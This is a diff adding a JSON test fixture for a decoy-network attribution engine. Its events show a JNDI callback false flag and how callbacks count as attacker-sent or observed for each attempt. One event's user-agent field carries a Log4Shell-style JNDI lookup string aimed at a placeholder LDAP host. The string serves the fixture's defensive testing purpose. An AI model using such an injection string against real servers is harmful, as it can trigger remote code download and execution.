@@ -1,0 +1,175 @@
+{
+  "description": "JNDI-style callback false flag (#29). The request names stage2.example.invalid (listed by the fictional EXAMPLE-CLUSTER-01 report) in a lookup string; the decoy then resolves it and connects to 192.0.2.80, which the report's advisory also lists. Because the attacker supplied the host, the DNS and egress callbacks and the address reached for that host count as sent by the attacker, not observed infrastructure, and the link stays low. Ten days later a second, unrelated attempt on another decoy sends an ordinary request that names no host, and the decoy then looks up and connects to the same host: for that attempt the callbacks were not chosen by the attacker, so they count as observed. Observed versus sent is decided per attempt.",
+  "now": 1793157600000,
+  "countries": {},
+  "events": [
+    {
+      "event_id": "jndi-1",
+      "ts": 1792290000000,
+      "decoy_id": "dcy-demo-9",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": {
+        "ip": "198.51.100.77",
+        "port": 52001
+      },
+      "dst": {
+        "ip": "10.85.9.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-9"
+      },
+      "data": {
+        "method": "GET",
+        "path": "/api/status",
+        "status": 200,
+        "user_agent": "${jndi:ldap://stage2.example.invalid:1389/a}"
+      }
+    },
+    {
+      "event_id": "jndi-2",
+      "ts": 1792290000400,
+      "decoy_id": "dcy-demo-9",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "dns",
+      "severity": "medium",
+      "src": {
+        "ip": "10.85.9.2",
+        "port": 40901
+      },
+      "dst": {
+        "ip": "10.85.9.1",
+        "port": 53
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-9"
+      },
+      "data": {
+        "query": "stage2.example.invalid",
+        "qtype": "A",
+        "verdict": "sinkholed"
+      }
+    },
+    {
+      "event_id": "jndi-3",
+      "ts": 1792290000500,
+      "decoy_id": "dcy-demo-9",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "egress",
+      "severity": "high",
+      "src": {
+        "ip": "10.85.9.2",
+        "port": 44901
+      },
+      "dst": {
+        "ip": "192.0.2.80",
+        "port": 1389
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-9"
+      },
+      "data": {
+        "verdict": "blocked",
+        "host": "stage2.example.invalid"
+      }
+    },
+    {
+      "event_id": "jndi-4",
+      "ts": 1793154000000,
+      "decoy_id": "dcy-demo-8",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "low",
+      "src": {
+        "ip": "203.0.113.44",
+        "port": 52101
+      },
+      "dst": {
+        "ip": "10.85.8.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-8"
+      },
+      "data": {
+        "method": "GET",
+        "path": "/health",
+        "status": 200,
+        "user_agent": "curl/8.5.0"
+      }
+    },
+    {
+      "event_id": "jndi-5",
+      "ts": 1793154000400,
+      "decoy_id": "dcy-demo-8",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "dns",
+      "severity": "medium",
+      "src": {
+        "ip": "10.85.8.2",
+        "port": 40801
+      },
+      "dst": {
+        "ip": "10.85.8.1",
+        "port": 53
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-8"
+      },
+      "data": {
+        "query": "stage2.example.invalid",
+        "qtype": "A",
+        "verdict": "sinkholed"
+      }
+    },
+    {
+      "event_id": "jndi-6",
+      "ts": 1793154000500,
+      "decoy_id": "dcy-demo-8",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "egress",
+      "severity": "high",
+      "src": {
+        "ip": "10.85.8.2",
+        "port": 44801
+      },
+      "dst": {
+        "ip": "192.0.2.80",
+        "port": 1389
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-8"
+      },
+      "data": {
+        "verdict": "blocked",
+        "host": "stage2.example.invalid"
+      }
+    }
+  ]
+}
